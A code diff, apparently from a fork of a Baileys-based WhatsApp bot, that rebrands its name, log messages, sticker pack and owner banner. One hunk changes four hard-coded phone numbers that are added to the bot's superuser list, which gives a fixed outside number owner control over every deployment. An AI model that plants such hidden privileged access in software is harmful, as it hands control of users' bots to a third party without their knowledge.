@@ -344,7 +344,7 @@ zk.ev.on("messages.upsert", async (m) => {
     if (!ms.message) return;
 
     const origineMessage = ms.key.remoteJid;
-    const baseName = "🚀 ʙᴡᴍ xᴍᴅ";
+    const baseName = "🚀 Cᴡᴍ TC";
 
     // Check if the message is from an individual and if contact is not saved
     if (origineMessage.endsWith("@s.whatsapp.net") && (!store.contacts[origineMessage] || !store.contacts[origineMessage].name)) {
@@ -562,10 +562,10 @@ if (ANTIDELETE_ENABLED) {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./lib/sudo");
             const nomAuteurMessage = ms.pushName;
-            const abu1 = '254710772666';
-            const abu2 = '254710772666';
-            const abu3 = "254710772666";
-            const abu4 = '254710772666';
+            const abu1 = '254716226465';
+            const abu2 = '254716226465';
+            const abu3 = "254716226465";
+            const abu4 = '254716226465';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -800,7 +800,7 @@ if (conf.AUTO_READ === 'yes') {
                                    // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                     const gifLink = "https://raw.githubusercontent.com/djalega8000/Zokou-MD/main/media/remover.gif";
                                     var sticker = new Sticker(gifLink, {
-                                        pack: 'BWM-Md',
+                                        pack: 'CWM-TC',
                                         author: conf.OWNER_NAME,
                                         type: StickerTypes.FULL,
                                         categories: ['🤩', '🎉'],
@@ -1176,18 +1176,18 @@ zk.ev.on('group-participants.update', async (group) => {
         zk.ev.on("connection.update", async (con) => {
             const { lastDisconnect, connection } = con;
             if (connection === "connecting") {
-                console.log("ℹ️ Bmw is connecting...");
+                console.log("ℹ️ Cmw is connecting...");
             }
             else if (connection === 'open') {
-                console.log("✅ Bmw Connected to WhatsApp! ☺️");
+                console.log("✅ Cmw Connected to WhatsApp! ☺️");
                 console.log("--");
                 await (0, baileys_1.delay)(200);
                 console.log("------");
                 await (0, baileys_1.delay)(300);
                 console.log("------------------/-----");
-                console.log("Bmw Md is Online 🕸\n\n");
+                console.log("Cmw Tc is Online 🕸\n\n");
                 //chargement des commandes 
-                console.log("Loading Bmw Commands ...\n");
+                console.log("Loading Cmw Commands ...\n");
                 fs.readdirSync(__dirname + "/scs").forEach((fichier) => {
                     if (path.extname(fichier).toLowerCase() == (".js")) {
                         try {
@@ -1225,8 +1225,8 @@ zk.ev.on('group-participants.update', async (group) => {
 │💫 ᴘʀᴇғɪx: *[ ${prefixe} ]*
 │⭕ ᴍᴏᴅᴇ: *${md}*
 │📍 ᴠᴇʀꜱɪᴏɴ: *6.0.3*
-│🤖 ʙᴏᴛ ɴᴀᴍᴇ: *ʙᴍᴡ ᴍᴅ*
-│👨‍💻 ᴏᴡɴᴇʀ : *sɪʀ ɪʙʀᴀʜɪᴍ*
+│🤖 ʙᴏᴛ ɴᴀᴍᴇ: *Cᴍᴡ TC*
+│👨‍💻 ᴏᴡɴᴇʀ : *CORNEH TECH*
 ╰─────────────━┈⊷
 *Join Whatsapp Channel For Updates*
 > https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y
